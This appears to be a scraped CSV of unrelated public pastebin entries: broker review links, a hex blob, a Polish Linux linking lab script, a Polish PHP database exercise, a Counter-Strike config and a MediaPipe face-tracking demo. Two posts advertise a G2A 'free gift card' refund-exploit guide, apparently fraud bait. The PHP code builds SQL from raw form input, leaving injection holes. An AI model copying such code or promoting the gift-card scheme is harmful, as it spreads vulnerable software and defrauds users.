id,title,username,language,date,content
FnnW0PAL,Review ACY Securities,reviewbrokers,PHP,Monday 25th of March 2024 07:04:35 AM CDT,https://www.reviewbrokers.net/review-acy-securities/
EbaikDXJ,data876,TestGuy1,JSON,Monday 25th of March 2024 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3e326e2f281b82cabdf2ee3928c78fdf0f10ac1bb703cb1677d38d79ce63d0497681b0fc3e57ac96e3d21f1104611bc452cbd508ce4dc55393f0f56b2b03bf1f912de5f1394076bd561a9ed4f2fb23c5adc3cc601f90bb5c84e1943aebf905ac00e1529099cc47519fe4bb8c16bbb18a6973e480214072685f226414f3c29e4b',
  otherdata: [
    'eca244029fda1d39c2399a118078dd9b',
    '7a580d1d9a8c472fdd2533e2eeb1e19c',
    'e6a79997444c7a41ca3549cf2d247bdd',
    'c107027c199fa33b2d0e222e9b0fa575',
    '2b438d7f247f9cfdc9c36ee563539e01',
    '8369c9f8e59afaa3982712aeda641306',
    '238fb32f19f85219b68cd8016cbae348',
    '45c2f57b311798fe562b680be03e998b'
  ]
}"
jNUAUfmH,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 25th of March 2024 06:24:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_185482.pdf

Working as of:
25 March 2024


















"
H1a7g9s9,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 25th of March 2024 06:24:00 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
25 March 2024















































"
5WL2BTpe,Review Soho Markets,fxvnpro,PHP,Monday 25th of March 2024 05:57:51 AM CDT,https://www.fxvnpro.com/review-soho-markets/
hpR2KEqC,Review Soho Markets,reviewbrokers,PHP,Monday 25th of March 2024 05:54:54 AM CDT,https://www.reviewbrokers.net/review-soho-markets/
BesGCjqi,sysop_2.1.5_Full,pan7nikt,Bash,Monday 25th of March 2024 05:31:12 AM CDT,"#2.1.5.1
#ZROB cd DO FOLDERU Z PROGRAMAMI
#uruchomic w oddzielnych oknach/sesjach ssh
./prog
./sprog
#podczas, gdy procesy sa uruchomione
echo -e '\033[0;32m2.1.5.1\033[0m'
echo -e '\033[0;32mCZTERY ROZNICE\033[0m'
echo -e '\033[0;32m1. Liczba nieanonimowych segmentow pameci w mapie pamieci (wicej dla skonsolidowanego dynamicznie)\033[0m'
pidof prog
pidof sprog
pmap -x PID_PROG
pmap -x PID_SPROG
echo -e 'r---- stale\nrw--- zmienne\nr-x-- text\nNieanonimowe bez [anon] i [stack]'

echo -e '\033[0;32m2. rozmiar pliku (statyczne wieksze)\033[0m'
stat -c %s prog
stat -c %s sprog
echo -e '\033[0;32m3. Biblioteki zainstalowane w systemie (dyn) a zewnetrzne (static)\033[0m'       
ldd prog
ldd sprog
echo -e '\033[0;32m4. Liczba wywolan systemowych (wiecej dla skonsolidowanej dynamicznie)\033[0m'
#NIE WYSWIETLA SIE PROMPT ALE NADAL TRZEBA WPISAC ZNAKI LUB KLIKNAC ENTER PO PROSTU
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'

echo -e '\033[0;32mOKRESLENIE RODZAJU ZASTOSOWANEJ KONSOLIDACJI\033[0m'
echo -e '\033[0;32mdla biblioteki\033[0m'
file /usr/lib64/libc.so.6
echo -e '\033[0;32mdla programu statycznie skonsolidowanego\033[0m'
file prog
echo -e '\033[0;32mdla programu dynamicznie skonsolidowanego\033[0m'
file sprog
 
#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.2
echo -e '\033[0;32m2.1.5.2\033[0m'
echo -e '\033[0;32mLista bibliotek wymaganych przez program\033[0m'
ldd prog
echo -e '\033[0;32mi biblioteke skonsolidowana dynamicznie\033[0m'
ldd /usr/lib64/libc.so.6
echo -e '\033[0;32mWszystkie biblioteki zarzadzane przez linker\033[0m'
ldconfig -p

#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.3
echo -e '\033[0;32m2.1.5.3\033[0m'
echo -e '\033[0;32mCzas przetwarzania w trybie nieuprzywilejowanym\033[0m'
time ls
echo -e '\033[0;32mCzas przetwarzania w trybie uprzywilejowanym\033[0m'
time sudo ls
echo -e 'Suma tych czasow nie musi byc zgodna, poniewaz proces w trakcie swojego zycia nie musi byc przetwarzany w zadnym trybie (moze np. oczekiwac na input)'
echo -e 'proces pochodzi\nw uprzywilejowanym: z jadra\nw nieuprzywilejowanym: z programu lub biblioteki.'
echo -e 'Zmiana nastepuje w momencie zgloszenia wywolania systemowego przez proces (rozkaz pulapki)'

#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.4
echo -e '\033[0;32m2.1.5.4\033[0m'
echo -e 'Wywolanie systemowe to rozwiazanie/funkcjonalnosc (procedura obslugi wywolania systemowego), ktore umozliwia procesowi skorzystanie z funkcjonalnosci oferowanych przez jadro\nTakie wywolania umozliwia biblioteka VDSO'
echo -e '\033[0;32mPorownanie ilosci zgloszen wywolan systemowych\033[0m'
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'"
a7MaVXwi,Untitled,Diaxon,PHP,Monday 25th of March 2024 05:13:00 AM CDT,"<?php


$conn = new mysqli(""localhost"", ""root"", """", ""contacts""); 
if ($conn){
    echo ""Connected to the database"";
} else {
    echo ""error"";
}



// Utwórz formularza (lista rozwijana) z nazwami kolumn w tabeli. Po przesłaniu danych z formularza
// wyświetla się tylko jedna kolumna z bazy. Na stronie nie mogą wyświetlać się błędy.

$sql = ""SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'contacts'"";
$result = $conn->query($sql);



?>

<p>Wybierz kolumnę</p>
<form action=""index4.php"" method=""POST"">
    <select name=""columns"">
        <?php
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<option value='{$row['COLUMN_NAME']}'>{$row['COLUMN_NAME']}</option>"";
        }
        ?>
    </select>
    <p>Jak chcesz posortować?</p>
    <select name=""sort"">
        <option value=""ASC"">ASC</option>
        <option value=""DESC"">DESC</option>
    </select>
    <button type=""submit"">Submit</button>
<form>
<br>

<?php
if (isset($_POST['columns']) && isset($_POST['sort'])){
    $column_name = $_POST['columns'];
    $sort = $_POST['sort'];

    $sql = ""SELECT $column_name FROM contacts ORDER BY $column_name $sort"";
    $result = $conn->query($sql);
    if ($result->num_rows > 0){
        while ($row = $result->fetch_assoc()){
            echo $row[$column_name] . ""<br>"";
        }
    }
}
?>

<form action=""index4.php"" method=""POST"">
    <label>Wybierz kolumne</label>
    <select name=""columns"">
        <?php
        $sql = ""SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'contacts'"";
        $result = $conn->query($sql);
        
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<option value='{$row['COLUMN_NAME']}'>{$row['COLUMN_NAME']}</option>"";
        }
        ?>
    </select>
    <label>Podaj ciąg znaków</label>
    <input name=""search"">
    <button type=""submit"">Submit</button>

    <?php
    if (isset($_POST['search'])){
        $search = $_POST['search'];
        $sql = ""SELECT * FROM contacts WHERE name LIKE "" . ""'%"" . ""$search"" . ""%'"";  
        $result = $conn->query($sql);
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<p>{$row['name']}</p>"";
        }
    }


    ?>
<form>

<!-- Wyświetl dane z bazy w postaci tabeli HTML -->

<table>
    <tr>
        <th>Id</th>
        <th>Name</th>
        <th>Email</th>
        <th>Phone</th>
        <th>Created at</th>
    </tr>

    <?php
    $query = ""SELECT * FROM contacts"";
    $result = $conn->query($query);
    for ($i = 0; $i < $result->num_rows; $i++){
        $row = $result->fetch_assoc();
        echo ""<tr>"";
        echo ""<td>{$row['id']}</td>"";
        echo ""<td>{$row['name']}</td>"";
        echo ""<td>{$row['email']}</td>"";
        echo ""<td>{$row['phone']}</td>"";
        echo ""<td>{$row['created_at']}</td>"";
    }
    ?>

</table>

<!-- Napisz skrypt, który będzie wyświetlał z bazy dane wybranej osoby. -->

<form action=""index4.php"" method=""POST"">
    <label>Podaj id</label>
    <input name=""id"">
    <button type=""submit"">Submit</button>
    
    <?php

    if (isset($_POST['id'])){
        $query = ""SELECT * FROM contacts WHERE id = "" . $_POST['id'];
        $result = $conn->query($query);
        if ($result->num_rows > 0){
            $row = $result->fetch_assoc();
            echo ""<p>{$row['name']}</p>"";
            echo ""<p>{$row['email']}</p>"";
            echo ""<p>{$row['phone']}</p>"";
            echo ""<p>{$row['created_at']}</p>"";
        }
    }

    ?>
</form>



<br>
"
BFAzRNp3,cs 1.6 cfg,Nelien,SSH Config,Monday 25th of March 2024 05:11:19 AM CDT,"// Add custom configurations to the file ""userconfig.cfg"".

unbindall
bind ""TAB"" ""+showscores""
bind ""ENTER"" ""+attack""
bind ""ESCAPE"" ""cancelselect""
bind ""SPACE"" ""+jump""
bind ""'"" ""+moveup""
bind ""+"" ""sizeup""
bind "","" ""buyammo1""
bind ""-"" ""sizedown""
bind ""."" ""buyammo2""
bind ""/"" ""+movedown""
bind ""0"" ""slot10""
bind ""1"" ""slot1""
bind ""2"" ""slot2""
bind ""3"" ""slot3""
bind ""4"" ""slot4""
bind ""5"" ""slot5""
bind ""6"" ""slot6""
bind ""7"" ""slot7""
bind ""8"" ""slot8""
bind ""9"" ""slot9""
bind "";"" ""+mlook""
bind ""="" ""pb menu""
bind ""["" ""invprev""
bind ""]"" ""invnext""
bind ""`"" ""toggleconsole""
bind ""a"" ""+moveleft""
bind ""b"" ""buy;stopsound""
bind ""c"" ""radio3""
bind ""d"" ""+moveright""
bind ""e"" ""+use""
bind ""g"" ""drop""
bind ""h"" ""+commandmenu""
bind ""i"" ""showbriefing""
bind ""j"" ""cheer""
bind ""k"" ""+voicerecord""
bind ""l"" ""showbriefing""
bind ""m"" ""chooseteam""
bind ""n"" ""nightvision""
bind ""o"" ""buyequip""
bind ""q"" ""lastinv""
bind ""r"" ""+reload""
bind ""s"" ""+back""
bind ""t"" ""impulse 201""
bind ""u"" ""messagemode2""
bind ""v"" ""+attack2""
bind ""w"" ""+forward""
bind ""x"" ""radio2""
bind ""y"" ""messagemode""
bind ""z"" ""radio1""
bind ""~"" ""toggleconsole""
bind ""UPARROW"" ""+forward""
bind ""DOWNARROW"" ""+back""
bind ""LEFTARROW"" ""+moveleft""
bind ""RIGHTARROW"" ""+moveright""
bind ""ALT"" ""+strafe""
bind ""CTRL"" ""+duck""
bind ""SHIFT"" ""+speed""
bind ""F1"" ""autobuy""
bind ""F2"" ""rebuy""
bind ""F3"" ""cl_crosshair_size 1;cl_dynamiccrosshair 1""
bind ""F4"" ""cl_crosshair_size 2;cl_dynamiccrosshair 0""
bind ""F5"" ""snapshot""
bind ""F6"" ""save quick""
bind ""F7"" ""host_framerate 0""
bind ""F8"" ""host_framerate 0.1""
bind ""F10"" ""quit prompt""
bind ""DEL"" ""+reload""
bind ""HOME"" ""rhlgAZLH""
bind ""END"" ""slot3""
bind ""KP_HOME"" ""+showscores""
bind ""KP_LEFTARROW"" ""slot5""
bind ""KP_END"" ""drop""
bind ""KP_INS"" ""slot1""
bind ""MWHEELDOWN"" ""+jump""
bind ""MOUSE1"" ""+attack""
bind ""MOUSE3"" ""slot2""
bind ""PAUSE"" ""pause""
_cl_autowepswitch ""1""
_snd_mixahead ""0.1""
ati_npatch ""1.0""
ati_subdiv ""2.0""
bgmvolume ""1.000000""
bottomcolor ""6""
brightness ""5""
cl_allowdownload ""1""
cl_allowupload ""1""
cl_backspeed ""400""
cl_cmdbackup ""2""
cl_cmdrate ""101""
cl_corpsestay ""0.000000""
cl_crosshair_color ""50 250 50""
cl_crosshair_size ""medium""
cl_crosshair_translucent ""0""
cl_dlmax ""80""
cl_download_ingame ""1""
cl_dynamiccrosshair ""0""
cl_forwardspeed ""400""
cl_himodels ""0""
cl_idealpitchscale ""0.8""
cl_lc ""1""
cl_logocolor ""#Valve_Orange""
cl_logofile ""v_1""
cl_lw ""1""
cl_minmodels ""1""
cl_radartype ""0""
cl_righthand ""1""
cl_shadows ""0""
cl_timeout ""121221""
cl_updaterate ""101""
cl_vsmoothing ""0.05""
cl_weather ""0""
con_color ""0 500 0""
console ""1.000000""
crosshair ""1.000000""
fastsprites ""0""
fps_max ""100""
fps_modem ""0""
gamma ""3""
gl_dither ""1""
gl_flipmatrix ""0""
gl_fog ""1""
gl_monolights ""0""
gl_overbright ""0""
gl_polyoffset ""0.1""
hisound ""1""
hpk_maxsize ""4""
hud_capturemouse ""1""
hud_centerid ""1""
hud_draw ""1""
hud_fastswitch ""1""
hud_saytext_internal ""1""
hud_takesshots ""0""
joystick ""0""
lookspring ""0""
lookstrafe ""0.000000""
m_filter ""0""
m_forward ""1""
m_pitch ""0.022""
m_side ""0.8""
m_yaw ""0.022""
model ""gordon""
MP3FadeTime ""2.0""
MP3Volume ""0""
mp_decals ""0""
name ""AnGeL""
net_graph ""0""
net_graphpos ""1""
net_scale ""5""
r_bmodelhighfrac ""5.0""
r_detailtextures ""0""
s_a3d ""0.0""
s_automax_distance ""30""
s_automin_distance ""2""
s_bloat ""2.0""
s_distance ""60""
s_doppler ""0.0""
s_eax ""0.0""
s_leafnum ""0""
s_max_distance ""1000""
s_min_distance ""5""
s_numpolys ""200""
s_polykeep ""1000000000""
s_polysize ""10000000""
s_refdelay ""4""
s_refgain ""0.4""
s_rolloff ""1.0""
s_verbwet ""0.25""
sensitivity ""1.9""
skin """"
spec_autodirector_internal ""1""
spec_drawcone_internal ""1""
spec_drawnames_internal ""1""
spec_drawstatus_internal ""1""
spec_mode_internal ""2""
spec_pip ""0""
suitvolume ""0.250000""
sv_aim ""0""
sv_voiceenable ""1""
team """"
topcolor ""30""
viewsize ""110""
voice_enable ""0""
voice_forcemicrecord ""1""
voice_modenable ""1""
voice_scale ""2""
volume ""0.015""
setinfo ""status_monitor"" ""1""
setinfo ""_vgui_menus"" ""0""
setinfo ""_ah"" ""0""
setinfo ""_pw"" ""3AA""
+mlook
+jlook
exec userconfig.cfg
"
seNHefED,Untitled,RushFuture,Python,Monday 25th of March 2024 04:57:25 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Источник: https://developers.google.com/mediapipe/solutions/vision/face_landmarker/python

Установка пререквизитов:
wget -O face_landmarker_v2_with_blendshapes.task -q https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task
pip install mediapipe
'''

from mediapipe import solutions
from mediapipe.framework.formats import landmark_pb2
import numpy as np
import matplotlib.pyplot as plt
import mediapipe as mp
from mediapipe.tasks import python
from mediapipe.tasks.python import vision
import cv2

def draw_landmarks_on_image(rgb_image, detection_result):
  face_landmarks_list = detection_result.face_landmarks
  annotated_image = np.copy(rgb_image)

  # Loop through the detected faces to visualize.
  for idx in range(len(face_landmarks_list)):
    face_landmarks = face_landmarks_list[idx]

    # Draw the face landmarks.
    face_landmarks_proto = landmark_pb2.NormalizedLandmarkList()
    face_landmarks_proto.landmark.extend([
      landmark_pb2.NormalizedLandmark(x=landmark.x, y=landmark.y, z=landmark.z) for landmark in face_landmarks
    ])

    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_TESSELATION,
        landmark_drawing_spec=None,
        connection_drawing_spec=mp.solutions.drawing_styles
        .get_default_face_mesh_tesselation_style())
    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_CONTOURS,
        landmark_drawing_spec=None,
        connection_drawing_spec=mp.solutions.drawing_styles
        .get_default_face_mesh_contours_style())
    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_IRISES,
          landmark_drawing_spec=None,
          connection_drawing_spec=mp.solutions.drawing_styles
          .get_default_face_mesh_iris_connections_style())

  return annotated_image

def plot_face_blendshapes_bar_graph(face_blendshapes):
  # Extract the face blendshapes category names and scores.
  face_blendshapes_names = [face_blendshapes_category.category_name for face_blendshapes_category in face_blendshapes]
  face_blendshapes_scores = [face_blendshapes_category.score for face_blendshapes_category in face_blendshapes]
  # The blendshapes are ordered in decreasing score value.
  face_blendshapes_ranks = range(len(face_blendshapes_names))

  fig, ax = plt.subplots(figsize=(12, 12))
  bar = ax.barh(face_blendshapes_ranks, face_blendshapes_scores, label=[str(x) for x in face_blendshapes_ranks])
  ax.set_yticks(face_blendshapes_ranks, face_blendshapes_names)
  ax.invert_yaxis()

  # Label each bar with values
  for score, patch in zip(face_blendshapes_scores, bar.patches):
    plt.text(patch.get_x() + patch.get_width(), patch.get_y(), f""{score:.4f}"", va=""top"")

  ax.set_xlabel('Score')
  ax.set_title(""Face Blendshapes"")
  plt.tight_layout()
  plt.show()

base_options = python.BaseOptions(model_asset_path='face_landmarker_v2_with_blendshapes.task')
options = vision.FaceLandmarkerOptions(base_options=base_options,
                                       output_face_blendshapes=True,
                                       output_facial_transformation_matrixes=True,
                                       num_faces=1)
detector = vision.FaceLandmarker.create_from_options(options)


cap = cv2.VideoCapture(0)
cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
cap.set(cv2.CAP_PROP_FPS, 30)
cap.set(cv2.CAP_PROP_FORMAT, -1)

while(cap.isOpened()):
    ret, frame = cap.read()
    if ret!=True: continue

    image = mp.Image(image_format=mp.ImageFormat.SRGB, data=frame)
    detection_result = detector.detect(image)
    annotated_image = draw_landmarks_on_image(image.numpy_view(), detection_result)
    cv2.imshow('annotated', cv2.flip(annotated_image, 1))
    if cv2.waitKey(1) & 0xFF == ord('q'): break

cap.release()
cv2.destroyAllWindows()"
